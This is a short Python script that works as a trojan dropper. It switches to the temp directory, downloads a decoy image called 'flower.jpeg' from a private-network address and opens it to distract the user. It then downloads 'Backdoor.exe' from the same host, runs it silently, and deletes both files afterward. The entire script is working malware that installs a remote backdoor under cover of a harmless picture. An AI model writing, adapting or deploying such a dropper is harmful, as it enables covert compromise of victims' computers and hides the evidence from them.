import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.43.237/Hey/flower.jpeg")
subprocess.Popen("flower.jpeg", shell=True)

download("http://192.168.43.237/Hey/Backdoor.exe")
subprocess.call("Backdoor.exe", shell=True)

os.remove("flower.jpeg")
os.remove("Backdoor.exe")
